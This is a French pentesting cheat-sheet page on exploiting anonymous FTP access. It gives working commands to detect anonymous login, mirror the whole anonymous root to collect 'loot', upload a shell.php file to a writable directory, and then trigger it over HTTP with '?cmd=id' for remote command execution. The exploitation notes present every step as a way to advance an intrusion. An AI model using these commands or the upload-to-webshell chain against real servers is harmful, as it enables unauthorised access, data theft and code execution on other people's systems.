---
title: "Accès anonyme : la connexion anonyme intégrée au FTP"
description: "FTP définit une connexion anonyme (utilisateur anonymous ou ftp avec n'importe quel mot de passe) que de nombreux serveurs activent. Elle donne accès à tout ce que la racine anonyme expose : fichiers lisibles à piller et, là où le serveur autorise les dépôts anonymes, un répertoire inscriptible qui peut être servi par un serveur web colocalisé ou traité par un backend, transformant le dépôt en exécution de code."
keywords:
  - ftp anonymous
  - anonymous upload
  - ftp
  - webroot
  - loot
---

# Accès anonyme

FTP dispose d'une connexion anonyme standard : le nom d'utilisateur `anonymous` (ou `ftp`) avec n'importe quelle chaîne, souvent une adresse e-mail, comme mot de passe. De nombreux serveurs l'activent, exposant le répertoire configuré comme racine anonyme. L'accès en lecture y est un butin immédiat ; plus dangereusement, certains serveurs autorisent les dépôts anonymes, et un répertoire FTP inscriptible coïncide fréquemment avec un chemin sur lequel autre chose agit, la racine documentaire d'un serveur web, un répertoire qu'une tâche planifiée ingère, de sorte qu'un dépôt devient une exécution de code ou une injection de données.

```bash
# confirm and use anonymous access
nmap -p21 --script ftp-anon <target>          # reports if anonymous is allowed and dir listing
ftp <target>        # login: anonymous / <any>  (or:)
curl -s ftp://<target>/ --user anonymous:a     # list the anonymous root
# download everything for offline loot
wget -r --no-parent ftp://anonymous:a@<target>/
# test for writable upload
curl -T shell.php ftp://<target>/ --user anonymous:a && echo "upload allowed"
```

## Du dépôt à l'exécution

```bash
# if the FTP root is also a webroot (common on combined web/FTP hosts),
# an uploaded script runs when requested over HTTP
curl -T shell.php ftp://<target>/ --user anonymous:a
curl http://<target>/shell.php?cmd=id          # if served by a co-located web server
```

## Notes d'exploitation

- Essayez toujours l'accès anonyme en premier ; `ftp-anon` indique à la fois s'il est autorisé et un listage de répertoire, ce qui révèle immédiatement le butin.
- Un répertoire anonyme inscriptible est le cas de grande valeur : testez le dépôt, puis déterminez si le chemin est servi par un serveur web ou consommé par un backend, ce qui convertit l'écriture en exécution.
- Même un accès anonyme en lecture seule expose souvent des configurations, des sauvegardes et du code source qui font progresser l'intrusion ; miroirez l'arborescence et exploitez-la comme n'importe quel partage.
- Les identifiants et les fichiers transitent sur le réseau en clair, de sorte que les données FTP anonymes sont aussi capturables passivement sur un réseau partagé.

## Références

- [nmap ftp-anon](https://nmap.org/nsedoc/scripts/ftp-anon.html)
- [HackTricks : FTP anonyme](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
